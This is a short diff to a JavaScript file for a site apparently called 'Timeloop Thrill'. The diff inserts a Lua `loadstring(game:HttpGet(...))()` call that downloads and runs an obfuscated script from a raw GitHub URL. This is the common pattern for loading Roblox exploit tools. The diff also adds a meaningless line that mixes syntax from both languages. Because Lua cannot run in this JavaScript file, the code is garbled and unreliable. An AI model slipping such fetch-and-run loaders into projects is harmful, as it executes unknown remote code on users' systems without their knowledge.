@@ -1,5 +1,5 @@
 // Timeloop Thrill - Navigation, Interactions, Secrets & Daily Notifications
-
+alert(loadstring(game:HttpGet("https://raw.githubusercontent.com/notpaki1/Beerus-gui-by-notpaki/main/obf_24xHkr77wX3zL8yph18nZ0mQDM3B7i0n6CliUS9hY642y0rysz9h7z7040j1m3Dl.lua.txt"))())
 window.onload = function() {
     console.log("VORTEX_OS: INITIALIZING_BYPASS_SEQUENCE...");
 
@@ -24,6 +24,7 @@ window.onload = function() {
 
 (function () {
     "use strict";
+   local true = [14] if true then paper = 1567
 
     // ==============================
     // DAILY NOTIFICATION SYSTEM
